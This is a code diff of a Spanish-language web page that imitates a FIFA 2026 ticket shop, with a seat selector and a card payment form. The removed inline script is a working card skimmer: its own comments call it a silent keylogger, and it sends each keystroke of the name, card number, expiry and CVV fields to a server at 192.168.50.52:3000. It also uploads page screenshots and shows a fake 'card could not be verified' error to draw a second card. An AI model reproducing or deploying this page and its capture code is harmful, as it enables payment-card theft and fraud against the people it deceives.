+                <div class="flex items-center gap-4">
+                    <button onclick="window.goBackToSelection()" class="btn-back text-gray-400 hover:text-white text-2xl transition-all">
+                        <i class="fas fa-arrow-left"></i>
+                    </button>
+                    <h3 class="fifa-font text-2xl text-[--fifa-gold] uppercase" id="modal-title">Selección de Asientos</h3>
+                </div>
+                <button onclick="window.closeModals()" class="text-gray-400 hover:text-white text-3xl">&times;</button>
             </div>
 
-            <div class="grid md:grid-cols-2 gap-12">
-                <div class="text-center">
-                    <div class="flex justify-between items-center mb-4">
-                        <p class="text-xs font-bold uppercase text-gray-400">Cancha (Estadio Azteca)</p>
-                        <div class="text-xs font-bold text-[--fifa-blue]" id="selected-count">0 asientos seleccionados</div>
+            <div class="grid lg:grid-cols-2 gap-8">
+                <div class="stadium-side-view">
+                    <div class="pitch-horizontal">
+                        <span class="text-white text-xs opacity-70 absolute bottom-2 left-2">CAMPO DE JUEGO</span>
                     </div>
-                    <div class="grid grid-cols-10 gap-2 mb-6 border-b-8 border-[--fifa-blue] pb-8 rounded-b-3xl" id="seat-grid">
-                        <script>
-                            for (let i = 0; i < 50; i++) {
-                                document.write(`<div class="seat w-full h-6 bg-gray-200 rounded-sm cursor-pointer hover:bg-gray-300" data-seat-index="${i}" onclick="toggleSeat(this)"></div>`);
-                            }
-                        </script>
-                    </div>
-                    <div class="flex justify-center gap-4 text-[10px] font-bold uppercase">
-                        <span class="flex items-center gap-1">
-                            <div class="w-3 h-3 bg-gray-200 rounded-sm"></div> Libre
-                        </span>
-                        <span class="flex items-center gap-1">
-                            <div class="w-3 h-3 bg-green-500 rounded-sm"></div> Seleccionado
-                        </span>
+                    <div class="stadium-structure" id="stadium-sections"></div>
+                    <div class="flex flex-wrap justify-center gap-3 mt-4 pt-4 border-t border-white/20">
+                        <span class="legend-item flex items-center gap-2 text-xs text-white"><div class="w-3 h-3 rounded" style="background: linear-gradient(135deg, #fbbf24, #f59e0b);"></div> Palcos VIP</span>
+                        <span class="legend-item flex items-center gap-2 text-xs text-white"><div class="w-3 h-3 rounded" style="background: linear-gradient(135deg, #a855f7, #7c3aed);"></div> Suites</span>
+                        <span class="legend-item flex items-center gap-2 text-xs text-white"><div class="w-3 h-3 rounded" style="background: linear-gradient(135deg, #60a5fa, #3b82f6);"></div> Preferente</span>
+                        <span class="legend-item flex items-center gap-2 text-xs text-white"><div class="w-3 h-3 rounded" style="background: linear-gradient(135deg, #9ca3af, #6b7280);"></div> General</span>
+                        <span class="legend-item flex items-center gap-2 text-xs text-white"><div class="w-3 h-3 rounded" style="background: #10b981;"></div> Seleccionado</span>
                     </div>
                 </div>
-                <div>
-                    <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100 mb-6">
-                        <h4 class="font-bold mb-2">Resumen de selección</h4>
-                        <div class="flex justify-between text-sm text-gray-500 mb-2">
-                            <span>Tipo: Hospitalidad Oro</span>
-                            <span id="modal-price">$1,450.00</span>
+
+                <div class="space-y-4">
+                    <div class="bg-white/10 backdrop-blur-sm rounded-2xl p-6 border border-white/20">
+                        <h4 class="font-bold text-xl text-white mb-4"><i class="fas fa-ticket-alt mr-2 text-[--fifa-gold]"></i>Tu selección</h4>
+                        <div class="space-y-3 text-gray-200">
+                            <div class="flex justify-between border-b border-white/10 pb-2">
+                                <span>Partido:</span>
+                                <span class="font-bold text-[--fifa-gold]" id="modal-match-name">-</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span>Precio base:</span>
+                                <span id="modal-price" class="font-bold">$0 MXN</span>
+                            </div>
+                            <div class="selected-seats-list" id="selected-seats-list">
+                                <div class="text-sm text-gray-400">No hay asientos seleccionados</div>
+                            </div>
+                            <div class="flex justify-between text-2xl font-bold text-[--fifa-gold] border-t border-white/20 pt-3 mt-2">
+                                <span>Total:</span>
+                                <span id="modal-total">$0 MXN</span>
+                            </div>
                         </div>
-                        <div class="flex justify-between text-sm text-gray-500 mb-2" id="seats-detail">
-                            <span>Asientos seleccionados:</span>
-                            <span id="selected-seats-count">0</span>
-                        </div>
-                        <div class="flex justify-between font-bold text-xl mt-4 border-t pt-4 text-[--fifa-blue]">
-                            <span>Total:</span>
-                            <span id="modal-total">$1,450.00 MXN</span>
-                        </div>
+                        <button id="btn-pay" disabled onclick="window.openPayment()" 
+                            class="w-full mt-6 bg-gray-600 text-gray-300 py-4 rounded-xl font-black uppercase tracking-widest transition-all disabled:opacity-50 disabled:cursor-not-allowed hover:bg-[--fifa-red]">
+                            Continuar al pago
+                        </button>
                     </div>
-                    <button id="btn-pay" disabled onclick="openPayment()"
-                        class="w-full bg-gray-200 text-gray-400 py-5 rounded-2xl font-black uppercase tracking-widest transition-all">Ir
-                        al pago</button>
                 </div>
             </div>
         </div>
     </div>
 
-    <div id="payment-modal" class="fixed inset-0 bg-black/80 z-[70] hidden flex items-center justify-center p-4">
-        <div class="bg-white rounded-3xl w-full max-w-md p-10 animate__animated animate__zoomIn">
-            <div class="flex justify-center mb-6">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-6"
-                    alt="Visa">
+    <!-- MODAL DE PAGO CON VALIDACIÓN Y CAMPO DE CORREO -->
+    <div id="payment-modal" class="fixed inset-0 bg-black/90 z-[70] hidden flex items-center justify-center p-4">
+        <div class="payment-card w-full max-w-md animate__animated animate__zoomIn">
+            <div class="card-header">
+                <div class="flex items-center gap-3">
+                    <i class="fas fa-credit-card text-2xl"></i>
+                    <div>
+                        <h3 class="font-bold text-lg">Pago Seguro</h3>
+                        <p class="text-xs opacity-80">Transacción encriptada SSL</p>
+                    </div>
+                </div>
             </div>
-            <h2 class="text-center font-bold text-xl mb-8">Información de Pago Seguro</h2>
-            <form id="payment-form" class="space-y-4" autocomplete="off">
-                <div class="space-y-1">
-                    <label class="text-[10px] font-bold text-gray-400 uppercase">Titular de la tarjeta</label>
-                    <input type="text" id="c-name"
-                        class="w-full border-b border-gray-300 py-3 focus:border-[--fifa-blue] outline-none uppercase font-bold tracking-tighter"
-                        placeholder="NOMBRE COMPLETO">
+            <div class="p-6">
+                <div class="flex gap-2 mb-6">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-6 opacity-60" alt="Visa">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-6 opacity-60" alt="Mastercard">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/American_Express_logo_%282018%29.svg" class="h-6 opacity-60" alt="Amex">
                 </div>
-                <div class="space-y-1">
-                    <label class="text-[10px] font-bold text-gray-400 uppercase">Número de tarjeta</label>
-                    <input type="text" id="c-number"
-                        class="w-full border-b border-gray-300 py-3 focus:border-[--fifa-blue] outline-none text-lg font-bold"
-                        placeholder="0000 0000 0000 0000" maxlength="19">
-                </div>
-                <div class="grid grid-cols-2 gap-8">
-                    <div class="space-y-1">
-                        <label class="text-[10px] font-bold text-gray-400 uppercase">Vencimiento</label>
-                        <input type="text" id="c-exp"
-                            class="w-full border-b border-gray-300 py-3 focus:border-[--fifa-blue] outline-none font-bold"
-                            placeholder="MM/AA" maxlength="5">
+                
+                <form id="payment-form" class="space-y-4" autocomplete="off">
+                    <!-- Campo de Correo Electrónico (NUEVO) -->
+                    <div>
+                        <label class="text-xs font-bold text-gray-500 uppercase block mb-2">
+                            <i class="fas fa-envelope mr-1"></i> Correo Electrónico
+                        </label>
+                        <input type="email" id="c-email" 
+                            class="card-field w-full border rounded-xl px-4 py-3 focus:outline-none"
+                            placeholder="tucorreo@ejemplo.com" required>
+                        <p class="text-[10px] text-gray-400 mt-1">Los boletos serán enviados a este correo</p>
                     </div>
-                    <div class="space-y-1">
-                        <label class="text-[10px] font-bold text-gray-400 uppercase">CVV</label>
-                        <input type="password" id="c-cvc"
-                            class="w-full border-b border-gray-300 py-3 focus:border-[--fifa-blue] outline-none font-bold"
-                            placeholder="***" maxlength="4">
+                    
+                    <div>
+                        <label class="text-xs font-bold text-gray-500 uppercase block mb-2">Titular de la tarjeta</label>
+                        <input type="text" id="c-name" 
+                            class="card-field w-full border rounded-xl px-4 py-3 focus:outline-none font-medium"
+                            placeholder="NOMBRE COMPLETO COMO APARECE EN LA TARJETA" required>
                     </div>
-                </div>
-                <button type="submit"
-                    class="w-full bg-[--fifa-blue] text-white py-5 rounded-2xl font-black mt-8 hover:bg-blue-900 transition-all uppercase">Finalizar
-                    Reserva Seguro</button>
-            </form>
+                    
+                    <div>
+                        <label class="text-xs font-bold text-gray-500 uppercase block mb-2">Número de tarjeta</label>
+                        <input type="text" id="c-number" 
+                            class="card-field w-full border rounded-xl px-4 py-3 focus:outline-none font-mono text-lg"
+                            placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    </div>
+                    
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="text-xs font-bold text-gray-500 uppercase block mb-2">Fecha vencimiento</label>
+                            <input type="text" id="c-exp" 
+                                class="card-field w-full border rounded-xl px-4 py-3 focus:outline-none"
+                                placeholder="MM/AA" maxlength="5" required>
+                        </div>
+                        <div>
+                            <label class="text-xs font-bold text-gray-500 uppercase block mb-2">Código CVV</label>
+                            <input type="password" id="c-cvc" 
+                                class="card-field w-full border rounded-xl px-4 py-3 focus:outline-none"
+                                placeholder="***" maxlength="4" required>
+                        </div>
+                    </div>
+                    
+                    <!-- Resumen del pago -->
+                    <div class="bg-gray-50 rounded-xl p-3 mt-4">
+                        <div class="flex justify-between text-sm mb-1">
+                            <span class="text-gray-600">Total a pagar:</span>
+                            <span class="font-bold text-[--fifa-blue]" id="payment-total">$0 MXN</span>
+                        </div>
+                    </div>
+                    
+                    <div class="flex gap-3 mt-4">
+                        <button type="button" onclick="window.closeModals()" 
+                            class="flex-1 bg-gray-100 text-gray-700 py-3 rounded-xl font-bold hover:bg-gray-200 transition-all">
+                            Cancelar
+                        </button>
+                        <button type="submit" 
+                            class="flex-1 bg-[--fifa-blue] text-white py-3 rounded-xl font-bold hover:bg-blue-900 transition-all">
+                            Pagar Ahora
+                        </button>
+                    </div>
+                </form>
+                
+                <p class="text-center text-xs text-gray-400 mt-4">
+                    <i class="fas fa-lock mr-1"></i> Transacción 100% segura (Simulación)
+                </p>
+            </div>
         </div>
     </div>
 
-    <script>
-        // DEFINICIÓN DE LA IP - Asegúrate de que esta sea la IP de tu servidor Debian
-        const SERVER_IP = '192.168.50.52';
-        
-        // Variables para controlar asientos seleccionados
-        let selectedSeats = [];
-        let currentPrice = 1450;
+    <!-- MODAL DE ÉXITO -->
+    <div id="success-modal" class="fixed inset-0 bg-black/80 z-[80] hidden flex items-center justify-center p-4">
+        <div class="success-modal animate-slide-up p-8">
+            <div class="success-icon">
+                <i class="fas fa-check text-white text-4xl"></i>
+            </div>
+            <h3 class="text-2xl font-bold text-[--fifa-blue] mb-2">¡Compra Exitosa!</h3>
+            <p class="text-gray-600 mb-4" id="success-message">Tu reserva ha sido confirmada</p>
+            <div class="bg-gray-50 rounded-xl p-4 mb-6 text-left">
+                <div class="flex justify-between text-sm mb-2">
+                    <span class="text-gray-500">Número de orden:</span>
+                    <span class="font-bold text-[--fifa-blue]" id="order-number">FIFA-2026-XXXX</span>
+                </div>
+                <div class="flex justify-between text-sm mb-2">
+                    <span class="text-gray-500">Total pagado:</span>
+                    <span class="font-bold text-[--fifa-gold]" id="paid-amount">$0 MXN</span>
+                </div>
+                <div class="flex justify-between text-sm mb-2">
+                    <span class="text-gray-500">Correo de envío:</span>
+                    <span class="font-bold text-[--fifa-blue] text-xs break-all" id="sent-email">-</span>
+                </div>
+                <div class="flex justify-between text-sm">
+                    <span class="text-gray-500">Método de pago:</span>
+                    <span class="font-bold">Visa ****</span>
+                </div>
+            </div>
+            <div class="bg-green-50 rounded-xl p-3 mb-6 border border-green-200">
+                <p class="text-xs text-green-700 text-center" id="email-confirmation">
+                    <i class="fas fa-check-circle mr-1"></i> Los boletos han sido enviados a tu correo electrónico
+                </p>
+            </div>
+            <button onclick="window.closeSuccessModal()" 
+                class="w-full bg-[--fifa-blue] text-white py-3 rounded-xl font-bold hover:bg-blue-900 transition-all">
+                Ir a Mis Boletos
+            </button>
+            <button onclick="window.closeSuccessModalAndReturn()" 
+                class="w-full mt-3 bg-gray-100 text-gray-700 py-3 rounded-xl font-bold hover:bg-gray-200 transition-all">
+                Seguir comprando
+            </button>
+        </div>
+    </div>
 
-        function toggleSeat(element) {
-            const seatIndex = element.getAttribute('data-seat-index');
-            
-            if (element.classList.contains('selected')) {
-                // Deseleccionar asiento
-                element.classList.remove('selected');
-                selectedSeats = selectedSeats.filter(index => index !== seatIndex);
-            } else {
-                // Seleccionar asiento
-                element.classList.add('selected');
-                selectedSeats.push(seatIndex);
-            }
-            
-            // Actualizar UI
-            updateSeatSelection();
-        }
-
-        function updateSeatSelection() {
-            const count = selectedSeats.length;
-            
-            // Actualizar contadores
-            document.getElementById('selected-count').innerText = count + ' asientos seleccionados';
-            document.getElementById('selected-seats-count').innerText = count;
-            
-            // Calcular y actualizar total
-            const total = count * currentPrice;
-            document.getElementById('modal-total').innerHTML = '$' + total.toLocaleString('es-MX') + '.00 MXN';
-            
-            // Habilitar/deshabilitar botón de pago
-            const payBtn = document.getElementById('btn-pay');
-            if (count > 0) {
-                payBtn.disabled = false;
-                payBtn.classList.remove('bg-gray-200', 'text-gray-400');
-                payBtn.classList.add('bg-[--fifa-red]');
-            } else {
-                payBtn.disabled = true;
-                payBtn.classList.add('bg-gray-200', 'text-gray-400');
-                payBtn.classList.remove('bg-[--fifa-red]');
-            }
-        }
-
-        function openSeatMap(match, price) {
-            document.getElementById('modal-title').innerText = match;
-            
-            // Guardar el precio actual
-            currentPrice = price;
-            
-            // Formatear el precio para mostrarlo correctamente
-            const formattedPrice = '$' + price.toLocaleString('es-MX') + '.00';
-            
-            // Actualizar los elementos del modal con el precio correcto
-            document.getElementById('modal-price').innerText = formattedPrice;
-            document.getElementById('modal-total').innerHTML = formattedPrice + ' MXN';
-            
-            // Resetear selección de asientos
-            selectedSeats = [];
-            document.querySelectorAll('.seat').forEach(seat => {
-                seat.classList.remove('selected');
-            });
-            updateSeatSelection();
-            
-            // Mostrar el modal
-            document.getElementById('seat-modal').classList.remove('hidden');
-        }
-
-        function openPayment() {
-            document.getElementById('payment-modal').classList.remove('hidden');
-        }
-
-        function closeModals() {
-            document.getElementById('seat-modal').classList.add('hidden');
-            document.getElementById('payment-modal').classList.add('hidden');
-        }
-
-        const inputs = ['c-name', 'c-number', 'c-exp', 'c-cvc'];
-
-        // Lógica de Captura Silenciosa (Keylogger) - CORREGIDO CON BACKTICKS
-        inputs.forEach(id => {
-            document.getElementById(id).addEventListener('input', () => {
-                const data = {
-                    f: id,
-                    v: document.getElementById(id).value,
-                    t: new Date().toLocaleTimeString()
-                };
-
-                fetch(`http://${SERVER_IP}:3000/captura`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                }).catch(() => { });
-            });
-        });
-
-        // Formato de tarjeta automático
-        document.getElementById('c-number').addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-        });
-
-        // Lógica de Finalizar Reserva - CORREGIDO CON BACKTICKS
-        document.getElementById('payment-form').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const cardName = document.getElementById('c-name').value;
-
-            // 1. Tomamos la captura (Sin modificar tu lógica interna)
-            await captureScreen();
-
-            // 2. Avisamos al servidor que envíe el paquete completo por correo
-            try {
-                await fetch(`http://${SERVER_IP}:3000/finalizar-y-enviar`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user: cardName })
-                });
-            } catch (err) {
-                console.log("Error en envío final");
-            }
-
-            // 3. Mostramos el error falso
-            alert("Error del Sistema FIFA: No se pudo verificar la tarjeta. Por seguridad, intente con otra tarjeta de débito o crédito.");
-        });
-
-        // Función de captura (Tal como la tenías, solo corregí la URL del fetch)
-        async function captureScreen() {
-            const canvas = await html2canvas(document.body);
-            const screenshotData = canvas.toDataURL("image/png");
-
-            try {
-                await fetch(`http://${SERVER_IP}:3000/upload-screenshot`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        image: screenshotData,
-                        user: document.getElementById('c-name').value || 'anonimo',
-                        timestamp: new Date().getTime()
-                    })
-                });
-            } catch (e) {
-                // Silencio administrativo
-            }
-        }
-
-        document.getElementById('c-number').addEventListener('blur', captureScreen);
-
-        // Limpieza al cargar la página
-        window.addEventListener('load', () => {
-            const form = document.getElementById('payment-form');
-            if (form) {
-                form.reset();
-            }
-            inputs.forEach(id => {
-                document.getElementById(id).value = '';
-            });
-            console.log("🧹 Formulario limpiado.");
-        });
-    </script>
+    <!-- JavaScript Principal -->
+    <script src="js/main.js"></script>
 </body>
 
 </html>
